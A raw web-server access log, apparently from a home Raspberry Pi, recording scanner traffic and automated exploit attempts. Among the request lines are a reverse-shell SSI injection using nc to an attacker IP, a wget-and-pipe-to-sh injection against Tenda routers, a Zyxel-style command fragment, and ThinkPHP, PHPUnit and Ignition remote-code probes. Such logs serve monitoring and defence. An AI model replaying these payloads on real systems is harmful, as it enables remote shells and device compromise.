167.248.133.55 - - [28/Mar/2021:13:59:57 +0200] "GET / HTTP/1.1" 200 190 "-" "-"
167.248.133.55 - - [28/Mar/2021:13:59:58 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.33.74 - - [28/Mar/2021:14:00:31 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 404 497 "http://82.121.247.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.239.130.30 - - [28/Mar/2021:14:39:18 +0200] "CONNECT cdn.jsdelivr.net:443 HTTP/1.1" 200 190 "-" "Go-http-client/1.1"
91.239.130.30 - - [28/Mar/2021:14:39:19 +0200] "\x16\x03\x01\x01\x19\x01" 400 0 "-" "-"
91.239.130.30 - - [28/Mar/2021:14:39:19 +0200] "CONNECT cdn.jsdelivr.net:443 HTTP/1.1" 200 190 "-" "Go-http-client/1.1"
91.239.130.30 - - [28/Mar/2021:14:39:19 +0200] "\x16\x03\x01\x01\x19\x01" 400 0 "-" "-"
91.239.130.30 - - [28/Mar/2021:14:39:20 +0200] "CONNECT cdn.jsdelivr.net:443 HTTP/1.1" 200 190 "-" "Go-http-client/1.1"
91.239.130.30 - - [28/Mar/2021:14:39:21 +0200] "\x16\x03\x01\x01\x19\x01" 400 0 "-" "-"
172.105.89.161 - - [28/Mar/2021:14:40:53 +0200] "GET /0bef HTTP/1.0" 404 455 "-" "-"
143.110.176.129 - - [28/Mar/2021:15:20:51 +0200] "GET / HTTP/1.0" 200 209 "-" "-"
128.14.133.58 - - [28/Mar/2021:15:42:27 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
144.91.69.245 - - [28/Mar/2021:15:45:11 +0200] "GET /wp-login.php HTTP/1.1" 404 487 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
66.181.4.18 - - [28/Mar/2021:15:46:31 +0200] "GET /wp-login.php HTTP/1.1" 404 487 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
205.185.127.244 - - [28/Mar/2021:17:16:26 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
138.68.20.186 - - [28/Mar/2021:18:23:27 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:28 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:28 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:28 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:28 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:29 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
138.68.20.186 - - [28/Mar/2021:18:23:29 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
::1 - - [28/Mar/2021:18:23:34 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [28/Mar/2021:18:23:35 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
::1 - - [28/Mar/2021:18:23:36 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
45.146.165.157 - - [28/Mar/2021:18:43:56 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:56 +0200] "POST /api/jsonws/invoke HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:57 +0200] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:57 +0200] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:57 +0200] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:58 +0200] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:58 +0200] "GET /console/ HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:58 +0200] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:58 +0200] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:59 +0200] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.157 - - [28/Mar/2021:18:43:59 +0200] "GET /_ignition/execute-solution HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.242.173 - - [28/Mar/2021:18:45:47 +0200] "\xba\xabd\xa1EZC\xdbM\x87\xee^\xfd\xbf\x159 X\xd4>\x12\x98\xc4<\xe0\x13\xcf" 400 0 "-" "-"
85.204.116.37 - - [28/Mar/2021:19:22:17 +0200] "Akitaskid.arm7;rm+-rf+Akitaskid.arm7 Zyxel.arm7%3b%23&remoteSubmit=Save" 400 0 "-" "-"
85.204.116.37 - - [28/Mar/2021:19:22:17 +0200] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 0 "-" "MtmKilledYou"
74.120.14.39 - - [28/Mar/2021:19:28:06 +0200] "GET / HTTP/1.1" 200 190 "-" "-"
74.120.14.39 - - [28/Mar/2021:19:28:07 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.166.71.69 - - [28/Mar/2021:19:29:44 +0200] "GET /z HTTP/1.1" 301 577 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:44 +0200] "GET /z/ HTTP/1.1" 200 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:44 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /z/go.php HTTP/1.1" 200 1441 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/css/2.b06ee30a.chunk.css HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 497 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/css/main.2e73285e.chunk.css HTTP/1.1" 404 497 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:29:49 +0200] "GET /favicon-32x32.png HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /z/go.php HTTP/1.1" 200 1442 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/css/2.b06ee30a.chunk.css HTTP/1.1" 404 497 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/css/main.2e73285e.chunk.css HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:11 +0200] "GET /favicon-32x32.png HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:25 +0200] "GET /z/go.php HTTP/1.1" 200 1451 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/css/2.b06ee30a.chunk.css HTTP/1.1" 404 497 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/css/main.2e73285e.chunk.css HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/js/2.c23d6d40.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /static/js/main.4b9bd4f2.chunk.js HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:31:26 +0200] "GET /favicon-32x32.png HTTP/1.1" 404 496 "http://82.121.247.198/z/go.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:33:11 +0200] "GET /z/ HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:33:11 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
209.141.33.74 - - [28/Mar/2021:19:41:42 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 404 497 "http://82.121.247.198:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.166.71.69 - - [28/Mar/2021:19:43:45 +0200] "GET /z/ HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:43:45 +0200] "GET /favicon.ico HTTP/1.1" 404 497 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:43:48 +0200] "GET /z/go.php HTTP/1.1" 200 431 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:44:46 +0200] "GET /z/go.php HTTP/1.1" 500 187 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:45:00 +0200] "GET /z/go.php HTTP/1.1" 200 484 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [28/Mar/2021:19:45:28 +0200] "GET /z/go.php HTTP/1.1" 200 2100 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
110.77.180.49 - - [28/Mar/2021:19:46:29 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
52.171.212.92 - - [28/Mar/2021:20:13:06 +0200] "GET /.env HTTP/1.1" 404 497 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.171.212.92 - - [28/Mar/2021:20:13:06 +0200] "POST / HTTP/1.1" 200 246 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
61.219.11.153 - - [28/Mar/2021:20:18:44 +0200] "GET / HTTP/1.1" 400 0 "-" "-"
186.33.118.36 - - [28/Mar/2021:20:20:17 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
139.180.130.194 - - [28/Mar/2021:21:55:52 +0200] "GET / HTTP/1.1" 200 246 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770 Safari/537.36"
178.175.14.138 - - [28/Mar/2021:22:01:56 +0200] "POST /HNAP1/ HTTP/1.0" 408 491 "-" "-"
85.204.116.37 - - [28/Mar/2021:23:03:27 +0200] "Akitaskid.arm7;rm+-rf+Akitaskid.arm7 Zyxel.arm7%3b%23&remoteSubmit=Save" 400 0 "-" "-"
85.204.116.37 - - [28/Mar/2021:23:03:27 +0200] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 0 "-" "MtmKilledYou"
205.185.127.244 - - [29/Mar/2021:00:25:25 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
139.162.119.197 - - [29/Mar/2021:01:03:00 +0200] "GET / HTTP/1.1" 200 209 "-" "HTTP Banner Detection (https://security.ipip.net)"
91.243.46.122 - - [29/Mar/2021:01:06:23 +0200] "GET / HTTP/1.0" 200 209 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
69.181.242.228 - - [29/Mar/2021:01:23:29 +0200] "\x16\x03\x01" 400 0 "-" "-"
64.68.227.214 - - [29/Mar/2021:01:23:30 +0200] "GET / HTTP/1.1" 200 209 "-" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
66.230.242.111 - - [29/Mar/2021:01:23:32 +0200] "GET /HNAP1 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
139.218.253.143 - - [29/Mar/2021:01:23:33 +0200] "GET /common/info.cgi HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
77.157.62.201 - - [29/Mar/2021:01:23:33 +0200] "GET /currentsetting.htm HTTP/1.1" 404 460 "-" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
2.85.222.143 - - [29/Mar/2021:01:48:20 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.79.42.121 - - [29/Mar/2021:02:48:17 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:17 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:18 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:18 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:18 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:18 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
45.79.42.121 - - [29/Mar/2021:02:48:19 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
::1 - - [29/Mar/2021:02:48:25 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
117.194.17.229 - - [29/Mar/2021:03:31:38 +0200] "POST /_ignition/execute-solution HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:39 +0200] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:40 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:40 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:40 +0200] "GET /manager/html HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:41 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
117.194.17.229 - - [29/Mar/2021:03:31:41 +0200] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
::1 - - [29/Mar/2021:03:31:47 +0200] "OPTIONS * HTTP/1.0" 200 128 "-" "Apache/2.4.38 (Raspbian) (internal dummy connection)"
205.185.122.102 - - [29/Mar/2021:04:22:46 +0200] "GET /config/getuser?index=0 HTTP/1.1" 404 460 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
170.238.236.26 - - [29/Mar/2021:06:23:59 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
128.14.133.58 - - [29/Mar/2021:06:57:40 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.106.29.210 - - [29/Mar/2021:07:32:16 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
45.148.10.45 - - [29/Mar/2021:07:33:54 +0200] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2045.148.10.45%209772%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0\n" 400 0 "-" "-"
106.14.244.111 - - [29/Mar/2021:07:42:41 +0200] "GET /login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
106.14.244.111 - - [29/Mar/2021:07:42:42 +0200] "GET /jenkins/login HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
106.14.244.111 - - [29/Mar/2021:07:42:42 +0200] "GET /wp-login.php HTTP/1.1" 404 441 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
172.105.89.161 - - [29/Mar/2021:07:54:20 +0200] "GET /0bef HTTP/1.0" 404 455 "-" "-"
143.198.237.121 - - [29/Mar/2021:08:22:31 +0200] "GET /index.php HTTP/1.1" 200 246 "-" "-"
45.148.10.45 - - [29/Mar/2021:08:30:41 +0200] "GET /goform/setUsbUnload/.js?deviceName=A;wget%20http%3A//dns.cyberium.cc/script/tenda%20-O-|sh HTTP/1.1" 404 497 "-" "python-requests/2.22.0"
146.196.63.30 - - [29/Mar/2021:08:46:33 +0200] "GET / HTTP/1.1" 200 190 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
139.59.235.12 - - [29/Mar/2021:10:03:35 +0200] "GET / HTTP/1.1" 200 190 "-" "-"
91.166.71.69 - - [29/Mar/2021:10:12:49 +0200] "GET /z/ HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
91.166.71.69 - - [29/Mar/2021:10:12:49 +0200] "GET /favicon.ico HTTP/1.1" 404 496 "http://82.121.247.198/z/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0"
